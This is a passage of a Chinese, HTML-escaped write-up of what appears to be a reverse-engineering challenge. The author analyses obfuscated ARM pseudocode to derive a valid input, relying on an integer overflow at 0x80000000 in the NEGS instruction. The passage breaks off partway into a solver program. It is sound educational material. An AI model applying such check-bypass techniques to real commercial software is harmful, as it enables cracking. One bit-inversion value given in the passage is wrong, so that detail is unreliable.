&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (&lt;span class=&quot;keyword&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)v2 &amp;gt; &lt;span class=&quot;number&quot;&gt;-109345567&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-242797719&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &lt;span class=&quot;keyword&quot;&gt;goto&lt;/span&gt; LABEL_28;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (&lt;span class=&quot;keyword&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)v2 &amp;gt; &lt;span class=&quot;number&quot;&gt;-32671955&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-109345566&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    sub_7509FAA4(v17 - &lt;span class=&quot;number&quot;&gt;631823485&lt;/span&gt; - v18 + &lt;span class=&quot;number&quot;&gt;631823485&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;LABEL_28:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;56101389&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (&lt;span class=&quot;keyword&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)v2 &amp;gt; &lt;span class=&quot;number&quot;&gt;32634615&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-32671954&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v5 = j_j___aeabi_i2d(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v7 = j_j_pow_0(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1076101120&lt;/span&gt;, v5, v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v9 = j_j___aeabi_d2iz(v7, v8);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v10 = j_j___aeabi_idiv(v17, v9);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v11 = j_j___modsi3(v10, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v12 = my_pow(v11);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v18 = -(-v18 - v12);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;142850058&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (&lt;span class=&quot;keyword&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)v2 &amp;gt; &lt;span class=&quot;number&quot;&gt;56101388&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第171行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;32634616&lt;/span&gt; )   &lt;span class=&quot;comment&quot;&gt;// 3）找到v2 = 32634616的地方。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-427046904&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v4 = &lt;span class=&quot;number&quot;&gt;-1611885754&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( !v29 ) &lt;span class=&quot;comment&quot;&gt;// v29要为1，不然就跳到LABEL_35去了，LABEL_35会改变v2的值。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;goto&lt;/span&gt; LABEL_35;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第181行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;56101389&lt;/span&gt; )   &lt;span class=&quot;comment&quot;&gt;// 4）找到v2 = 56101389的地方，事实上不用在往前找了，这里就是判断的地方。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v13 = sub_7509FAA4((&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *)&amp;amp;unk_59357062 + v17 - v18 - &lt;span class=&quot;number&quot;&gt;0x59357062&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v14 = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v13 &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ) &lt;span class=&quot;comment&quot;&gt;// v13需要小于0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        v14 = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v29 = v14;  &lt;span class=&quot;comment&quot;&gt;// 因为v29为1，因此v14要为1。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;32634616&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第212行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; v1;    &lt;span class=&quot;comment&quot;&gt;// 1）这里是返回，也就是逆推入口，我们要找到对r1赋值为1的地方。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从上面注释可以知道，也就是需要&lt;code&gt;sub_7509FAA4((char *)&amp;amp;unk_59357062 + v17 - v18 - 0x59357062);&lt;/code&gt;返回负数，现在我们需要做的就是搞清v17和v18的值是什么，以及&lt;code&gt;sub_7509FAA4&lt;/code&gt;的逻辑。关键代码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第33行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v17 = a1;   &lt;span class=&quot;comment&quot;&gt;// a1为整数部分，也就是v17也为整数部分&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第73行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == &amp;amp;unk_4A2AC114 )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-32671954&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v4 = &lt;span class=&quot;number&quot;&gt;-242797719&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v3 &amp;gt;= &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; ) &lt;span class=&quot;comment&quot;&gt;// 这里是一个for循环的跳出条件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;LABEL_35:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第126行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-1521320686&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ++v3;   &lt;span class=&quot;comment&quot;&gt;// for循环里的自增&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-1898177542&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 第157行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( v2 == (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;-32671954&lt;/span&gt; )  &lt;span class=&quot;comment&quot;&gt;// 这里面是for循环的主体&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v5 = j_j___aeabi_i2d(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v7 = j_j_pow_0(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1076101120&lt;/span&gt;, v5, v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v9 = j_j___aeabi_d2iz(v7, v8);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v10 = j_j___aeabi_idiv(v17, v9);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v11 = j_j___modsi3(v10, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v12 = my_pow(v11);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v18 = -(-v18 - v12);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v2 = (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&lt;span class=&quot;number&quot;&gt;142850058&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;v17为用户输入的Double数据的整数部分，v18在for循环里完成了赋值，那么这个for循环到底干了什么？我们先看前面几行代码：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;v5 = j_j___aeabi_i2d(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v7 = j_j_pow_0(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1076101120&lt;/span&gt;, v5, v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v9 = j_j___aeabi_d2iz(v7, v8);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v10 = j_j___aeabi_idiv(v17, v9);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v11 = j_j___modsi3(v10, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里几个函数都是一些除法、求余的操作。经过几轮动态调试，事实上，这个for循环的前五行代码就是逆向取出一个10位整数的每一位。举个例子，输入为1234567890，每一轮得到的依次为0，9，8，7，6，5，4，3，2，1。&lt;br&gt;现在还剩下一个&lt;code&gt;my_pow&lt;/code&gt;,顾名思义这是个幂相关的函数。注意我们不需要去具体分析&lt;code&gt;my_pow&lt;/code&gt;,因为我们的输入只有0-9这10种可能，几轮测试过后，得到结论：&lt;code&gt;my_pow&lt;/code&gt;返回输入数据的十次幂。&lt;br&gt;用C代码重现下这个for循环：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; integer; &lt;span class=&quot;comment&quot;&gt;// 用户输入的整数部分&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; out;    &lt;span class=&quot;comment&quot;&gt;// 即v12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;out = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;; ++i) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    x = integer / &lt;span class=&quot;built_in&quot;&gt;pow&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, i) % &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    out += pwo(x, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ok，现在&lt;code&gt;sub_7509FAA4((char *)&amp;amp;unk_59357062 + v17 - v18 - 0x59357062);&lt;/code&gt;中，我们知道v17为用户输入数据的整数部分，v18为上面的out，剩下的是分析&lt;code&gt;sub_7509FAA4&lt;/code&gt;的功能，f5得到伪代码，代码很短，而且逻辑也很简单，逻辑是这样的：如果参数（v17 - v18）为非负数直接返回该参数，如果参数为负数则求补之后返回。&lt;br&gt;这里遇到一个问题，由上面分析可知，需要&lt;code&gt;sub_7509FAA4&lt;/code&gt;返回负数，但是按照该函数逻辑，无论如何都会返回一个非负数！什么情况？经过1个小时的重新分析，排除了前面分析错误的情况，那么&lt;code&gt;sub_7509FAA4&lt;/code&gt;存在溢出？这个时候看伪代码已经没用了，通过对&lt;code&gt;sub_7509FAA4&lt;/code&gt;的汇编代码的分析，发现了溢出点：&lt;code&gt;NEGS    R1, R1&lt;/code&gt;，当参数为负数时，程序使用&lt;code&gt;NEGS&lt;/code&gt;指令求补后返回，其中&lt;code&gt;NEGS&lt;/code&gt;的作用是这样的：将目的操作数的所有数据位取反加1。当参数为0x80000000（这是个负数）时，所有数据位取反后为0x8fffffff，再加1后发生溢出，最后值为0x80000000。也就是说，0x80000000经过&lt;code&gt;NEGS&lt;/code&gt;后仍然为0x80000000。&lt;br&gt;终上所述，现在给出结论：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;输入数据为一个合法的十位Double数据，设其整数部分为integer。&lt;/li&gt;
&lt;li&gt;对integer的每一位求10次幂，并全部加起来，结果为sum。&lt;/li&gt;
&lt;li&gt;integer -sum == 0x80000000。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后给出计算输入的程序：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pow_table[] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x400&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0xe6a9&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x100000&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x9502f9&lt;/span&gt;, &lt;span 